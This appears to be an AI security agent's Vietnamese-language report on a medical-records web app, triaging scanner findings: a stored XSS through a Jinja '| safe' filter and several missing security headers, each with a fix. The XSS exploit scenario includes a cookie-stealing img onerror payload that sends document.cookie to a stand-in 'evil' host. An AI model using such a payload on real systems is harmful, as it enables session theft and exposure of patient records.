<!-- secagent-report -->
## 🛡️ AI Security Agent

**Kết quả:** 10 lỗi thật (TP) · 0 cần người xem (NEEDS_REVIEW) · 0 báo nhầm (FP) · trong đó 0 phát hiện mới do Agent tự tìm · commit `b6844e9`

| | Mức | Nguồn | Phát hiện | Vị trí | Độ tin cậy |
|---|---|---|---|---|---|
| 🔴 TP | HIGH | semgrep | security.semgrep.medicare.jinja-safe-filter (semgrep) | `app/medicare/templates/record/detail.html:29` | 0.95 |
| 🔴 TP | MEDIUM | zap | 10020 (zap) | `dast:GET /:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10020 (zap) | `dast:GET /login:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /appointments:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /appointments/{appointment_id}/confirm:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /patients:0` | 0.70 |
| 🔴 TP | MEDIUM | zap | 10038 (zap) | `dast:POST /patients/{patient_id}/edit:0` | 0.70 |
| 🔴 TP | LOW | zap | 10021 (zap) | `dast:GET /:0` | 0.70 |
| 🔴 TP | LOW | zap | 10021 (zap) | `dast:GET /health:0` | 0.65 |
| 🔴 TP | LOW | zap | 10038 (zap) | `dast:GET /login:0` | 0.70 |

### Chi tiết

#### 🔴 TP · HIGH · security.semgrep.medicare.jinja-safe-filter (semgrep) — `app/medicare/templates/record/detail.html:29`

CWE-79 · OWASP A05 · độ tin cậy 0.95 · nguồn: semgrep

**Phân tích:** `note.body | safe` render HTML thô do client gửi. `add_note` trong service.py chỉ strip và kiểm tra độ dài, không sanitize. Kẻ tấn công (bác sĩ phụ trách, hoặc bất kỳ ai gửi POST trực tiếp bỏ qua editor JS) có thể lưu `<script>` hoặc `<img onerror>`. Script chạy trên trình duyệt bệnh nhân, y tá, bác sĩ khác khi xem bệnh án. Ứng dụng cũng không có CSP nên không có lớp phòng thủ nào khác.

**Kịch bản khai thác:** Bác sĩ phụ trách bị chiếm tài khoản (hoặc độc hại) gửi POST /records/{id}/notes với body `<img src=x onerror=fetch('//evil/'+document.cookie)>`. Khi bệnh nhân hoặc bác sĩ khác mở bệnh án, script chạy và thực hiện hành động thay họ, hoặc đọc dữ liệu lâm sàng.

**Đề xuất sửa:** Bỏ `| safe` trong detail.html để Jinja tự escape, hoặc sanitize phía server bằng allowlist thẻ (p, b, i, u, ul, li, br) trước khi lưu trong `record/service.py::add_note` (ví dụ dùng thư viện nh3 hoặc bleach), và không cho phép thuộc tính hay URL scheme nguy hiểm. Có thể sanitize lại khi render. Thêm test XSS payload. Thêm header CSP làm lớp bảo vệ bổ sung.

#### 🔴 TP · MEDIUM · 10020 (zap) — `dast:GET /:0`

CWE-1021 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Tìm trong repo không thấy chỗ nào đặt X-Frame-Options hay frame-ancestors, nên phản hồi thiếu header chống clickjacking.

**Đề xuất sửa:** Thêm middleware toàn cục trong app factory đặt `X-Frame-Options: DENY` hoặc CSP `frame-ancestors 'none'` cho mọi response.

#### 🔴 TP · MEDIUM · 10020 (zap) — `dast:GET /login:0`

CWE-1021 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Repo không đặt header chống clickjacking ở bất kỳ đâu, kể cả trang /login.

**Đề xuất sửa:** Dùng middleware toàn cục đặt `X-Frame-Options: DENY` và CSP `frame-ancestors 'none'` cho mọi response.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /appointments:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có Content-Security-Policy ở đâu trong repo. Thiếu CSP làm XSS ở F1 dễ khai thác hơn.

**Đề xuất sửa:** Middleware toàn cục đặt CSP chặt (default-src 'self', script-src 'self', frame-ancestors 'none'). Script `rich-note.js` đã là file ngoài nên tương thích.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /appointments/{appointment_id}/confirm:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có CSP ở đâu trong repo.

**Đề xuất sửa:** Dùng middleware toàn cục đặt CSP cho mọi response.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /patients:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có CSP ở đâu trong repo.

**Đề xuất sửa:** Dùng middleware toàn cục đặt CSP cho mọi response.

#### 🔴 TP · MEDIUM · 10038 (zap) — `dast:POST /patients/{patient_id}/edit:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có CSP ở đâu trong repo.

**Đề xuất sửa:** Dùng middleware toàn cục đặt CSP cho mọi response.

#### 🔴 TP · LOW · 10021 (zap) — `dast:GET /:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có code nào đặt X-Content-Type-Options trong repo.

**Đề xuất sửa:** Middleware toàn cục thêm `X-Content-Type-Options: nosniff`.

#### 🔴 TP · LOW · 10021 (zap) — `dast:GET /health:0`

CWE-693 · OWASP A02 · độ tin cậy 0.65 · nguồn: zap

**Phân tích:** Không có code nào đặt X-Content-Type-Options trong repo, kể cả /health. Mức ảnh hưởng thấp.

**Đề xuất sửa:** Middleware toàn cục thêm `X-Content-Type-Options: nosniff`.

#### 🔴 TP · LOW · 10038 (zap) — `dast:GET /login:0`

CWE-693 · OWASP A02 · độ tin cậy 0.70 · nguồn: zap

**Phân tích:** Không có code nào đặt X-Content-Type-Options trong repo.

Gộp các phát hiện: `zap:10021:dast:GET /login:0`, `zap:10038:dast:GET /login:0`

**Đề xuất sửa:** Middleware toàn cục thêm `X-Content-Type-Options: nosniff` cho mọi response.

---
<sub>LLM `claude-mcp` · model `claude-sonnet-5-5` · chiến lược `agent` · 32.5 s · 14 lần gọi LLM · 13 lần gọi công cụ · 73619 token vào / 4770 token ra · ≈ $0.1226 · chạm giới hạn: không</sub>
